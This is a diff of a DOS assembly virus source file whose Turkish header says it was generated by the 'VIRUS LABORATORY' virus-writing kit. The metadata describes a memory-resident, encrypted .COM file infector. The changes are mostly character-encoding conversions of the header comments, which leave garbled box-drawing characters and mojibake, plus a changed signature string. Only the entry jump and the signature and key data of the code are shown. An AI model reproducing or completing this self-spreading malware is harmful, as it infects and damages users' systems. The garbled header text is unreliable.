@@ -1,23 +1,23 @@
-;ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
-;บ      Bu virus , 'VIRUS LABORATORY' programi tarafindan hazirlanmistir.   บ
-;ฬออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออน
-;บ      VIRUS LABORATORY programi Sleyman GNEL (eGo) tarafindan 1998 tari-บ
-;บ hinde yazilmistir. Programin amaci istenen aktiviteleri g”sterebilecek   บ
-;บ bilgisayar virslerinin yazilmasi islemini otomatiklestirmektir.         บ
-;ฬออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออน
-;บ                                 UYARI !!!                                บ
-;บ      Gerek 'VIRUS LABORATORY' programinin gerekse de bu program tarafin- บ
-;บ dan retilmis viruslerin sebep olabilecegi hibir problem ve zarardan    บ
-;บ programin yazari - Sleyman GNEL - sorumlu tutulamaz. Bu programlarin   บ
-;บ kullanilmasi ile bu sart otomatik olarak kabul edilmis olmaktadir.       บ
-;ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
+;รรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรยป
+;ยบ      Bu virus , 'VIRUS LABORATORY' programi tarafindan hazirlanmistir.   ยบ
+;รรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรยน
+;ยบ      VIRUS LABORATORY programi Sรผleyman GรNEL tarafindan 1998 tarihinde  ยบ
+;ยบ yazilmistir. Programin amaci istenen aktiviteleri gรถsterebilecek bilgi-  ยบ
+;ยบ sayar virรผslerinin yazilmasi islemini otomatiklestirmektir.              ยบ
+;รรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรยน
+;ยบ                                 UYARI !!!                                ยบ
+;ยบ      Gerek 'VIRUS LABORATORY' programinin gerekse de bu program tarafin- ยบ
+;ยบ dan รผretilmis viruslerin sebep olabilecegi hiรงbir problem ve zarardan    ยบ
+;ยบ programin yazari - Sรผleyman GรNEL - sorumlu tutulamaz. Bu programlarin   ยบ
+;ยบ kullanilmasi ile bu sart otomatik olarak kabul edilmis olmaktadir.       ยบ
+;รรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรยผ
 ;
 ;Versiyon.......: 1.50
-;Yazan..........: VIRUS LABORATORY (Sleyman GNEL (eGo))
+;Yazan..........: VIRUS LABORATORY (Sยleyman GลกNEL (eGo))
 ;Tarih..........: 30/11/2001
 ;Saat...........: 19:53:21
 ;Genel..........: TSR + Bulasici (.COM) + Encrypt + Actions
-;Ek bilgi.......: COMMAND.COM ve WIN.COM dosyalarna bulasmaz
+;Ek bilgi.......: COMMAND.COM ve WIN.COM dosyalarยna bulasmaz
 ;
 ;============================================================================
 .286
@@ -27,7 +27,7 @@ org 100h
 ;
 ;=============================== ANA PROGRAM ================================
 Start: jmp Sifreli
-Imza:  db '‘– ฅ'
+Imza:  db 'โ€โ€กล’โ€โ€“โ€บย ยฅ'
 Dosya: dw 0f0f0h
 Sifre: dw 0b0b0h
 ;----------------------------------------------------------------------------
@@ -1019,3 +1019,4 @@ Finish:
  
 cseg ends
 end Start
+
